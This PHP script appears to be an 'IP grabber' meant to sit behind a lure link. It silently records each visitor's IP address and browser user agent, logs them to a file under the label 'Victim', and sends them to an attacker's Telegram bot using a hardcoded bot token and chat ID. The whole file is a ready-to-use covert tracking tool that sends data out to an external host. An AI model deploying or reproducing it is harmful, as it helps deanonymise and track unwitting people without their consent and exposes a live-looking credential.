<?php

// Get IP address
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'] . "\r\n";
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n";
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'] . "\r\n";
}

// Get user agent
$browser = $_SERVER['HTTP_USER_AGENT'];

// Prepare to write to file
$file = 'ip.txt';
$fp = fopen($file, 'a');

// Prepare the victim message
$victim = "\nIP: ";
fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, "User-Agent: " . $browser . "\n");
fclose($fp);

// Prepare Telegram message
$token = '7720546289:AAGdqF1CC8TGvRilFa7-bhXmanmwFoiefRo'; // Replace with your actual bot token
$id = '6389977474'; // Replace with your actual chat ID
$message = 'Victim: ' . $victim . "\n";
$message .= 'IP ADDRESS: ' . $ipaddress . "\n";
$message .= 'USER AGENT: ' . $browser . "\n";

// Send message to Telegram
$telegramAPI = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=" . urlencode($message);
$response = file_get_contents($telegramAPI);

// Check response
if ($response) {
    echo 'Successfully sent to Telegram';
} else {
    echo 'Failed to send message to Telegram';
}
?>